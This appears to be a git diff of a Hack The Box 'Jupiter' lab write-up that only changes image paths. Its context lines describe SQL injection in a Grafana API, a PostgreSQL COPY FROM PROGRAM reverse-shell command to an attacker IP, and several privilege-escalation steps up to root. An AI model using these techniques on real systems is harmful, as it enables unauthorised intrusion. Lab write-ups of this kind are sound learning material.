@@ -21,7 +21,7 @@ We have to add `jupiter.htb` to our `/etc/hosts` file to view port 80.
 
 The website was a typical corporate site:
 
-![](<../../../.gitbook/assets/image%20(706).png>)
+![](../../../.gitbook/assets/jupiter-13.png)
 
 There was nothing inherently interesting about the website itself, so I ran a directory and subdomain scan on it. A `wfuzz` subdomain scan found this:
 
@@ -43,13 +43,13 @@ ID           Response   Lines    Word       Chars       Payload
 
 There's a `kiosk` endpoint. When visited, it shows a Grafana dashboard:
 
-![](<../../../.gitbook/assets/image%20(1123).png>)
+![](../../../.gitbook/assets/jupiter-1.png)
 
 ### API SQL Injection
 
 When viewing the traffic in Burp, we can see a lot of requests sent to an `/api` endpoint:
 
-![](<../../../.gitbook/assets/image%20(2918).png>)
+![](../../../.gitbook/assets/jupiter-9.png)
 
 I viewed the requests and found this `query` request:
 
@@ -78,7 +78,7 @@ Connection: close
 
 This query was sending a query to the backend database, and it look like it's vulnerable to SQL injection. We can attempt the PostGreSQL RCE exploit, which involves creating a table `cmd_exec`.
 
-![](<../../../.gitbook/assets/image%20(2128).png>)
+![](../../../.gitbook/assets/jupiter-7.png)
 
 Now, we just need to execute a reverse shell with this query:
 
@@ -88,7 +88,7 @@ COPY cmd_exec FROM program 'bash -c \"bash -i >& /dev/tcp/10.10.14.10/4444 0>&1\
 
 Then, we would catch a reverse shell on a listener port:
 
-![](<../../../.gitbook/assets/image%20(3740).png>)
+![](../../../.gitbook/assets/jupiter-12.png)
 
 ## Privilege Escalation
 
@@ -183,11 +183,11 @@ hosts:
 
 We can overwrite the existing file using `wget -O`. Afterwards, we can easily get a user shell:
 
-![](<../../../.gitbook/assets/image%20(2712).png>)
+![](../../../.gitbook/assets/jupiter-8.png)
 
 We can drop our public key into the `authorized_keys` folder to upgrade our shell.
 
-![](<../../../.gitbook/assets/image%20(1505).png>)
+![](../../../.gitbook/assets/jupiter-3.png)
 
 ### Jupyter -> Jovian Shell
 
@@ -212,7 +212,7 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 Port 8888 was a HTTP port, so let's do some `chisel` forwarding. When visited, it shows a Jupyter instance:
 
-![](<../../../.gitbook/assets/image%20(883).png>)
+![](../../../.gitbook/assets/jupiter-14.png)
 
 There was some token required before we could visit the site. Normally, I'd access this through running `jupyter notebook list`, but there are Python errors with this method. So, we would have to find the source of this website instead to either fix the error or view the logs to find a token. A bit of enumeration reveals that the `/opt` directory contains some interesting files:
 
@@ -250,27 +250,27 @@ juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-08-18.log
 
 We can visit the site with the `?token` parameter at the end and be brought to a file directory:
 
-![](<../../../.gitbook/assets/image%20(934).png>)
+![](../../../.gitbook/assets/jupiter-15.png)
 
 When we click 'New', there's an option to create a new Notebook:
 
-![](<../../../.gitbook/assets/image%20(1959).png>)
+![](../../../.gitbook/assets/jupiter-5.png)
 
 This brings us to what seems to be a Python interpreter:
 
-![](<../../../.gitbook/assets/image%20(2952).png>)
+![](../../../.gitbook/assets/jupiter-10.png)
 
 I simply ran a command to generate another SUID binary on the machine.
 
-![](<../../../.gitbook/assets/image%20(1459).png>)
+![](../../../.gitbook/assets/jupiter-2.png)
 
 This gives us an easy shell as the new user:
 
-![](<../../../.gitbook/assets/image%20(3647).png>)
+![](../../../.gitbook/assets/jupiter-11.png)
 
 We can also get a reverse shell using this method by replacing the command run.
 
-![](<../../../.gitbook/assets/image%20(2037).png>)
+![](../../../.gitbook/assets/jupiter-6.png)
 
 ### Sudo Privileges
 
@@ -298,6 +298,6 @@ ls -la /usr/local/bin/sattrack
 
 We can just overwrite this with `/bin/bash`, and then run it using `sudo` to get an easy root shell.
 
-![](<../../../.gitbook/assets/image%20(1784).png>)
+![](../../../.gitbook/assets/jupiter-4.png)
 
 Rooted!
